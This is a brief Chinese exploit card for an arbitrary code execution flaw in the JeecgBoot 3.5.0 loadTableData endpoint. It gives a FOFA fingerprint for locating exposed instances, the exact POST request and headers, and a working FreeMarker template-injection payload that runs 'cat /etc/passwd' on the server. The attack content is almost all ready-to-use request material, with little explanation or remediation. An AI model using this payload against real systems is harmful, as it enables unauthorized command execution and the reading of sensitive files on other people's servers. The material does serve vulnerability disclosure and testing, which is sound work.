# JeecgBoot企业级低代码平台loadTableData存在任意代码执行漏洞

- **系统**：JeecgBoot　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="JeecgBoot-企业级低代码平台"`
- **请求**：`POST /jeecg-boot/jmreport/loadTableData HTTP/1.1`
- **关键头**：`Content-Type: application/json;charset=UTF-8`　`Content-Length: 161`

**请求体 / payload**
```
{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"cat /etc/passwd\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
```

**其他**
- JeecgBoot企业级低代码平台loadTableData存在任意代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * JeecgBoot 3.5.0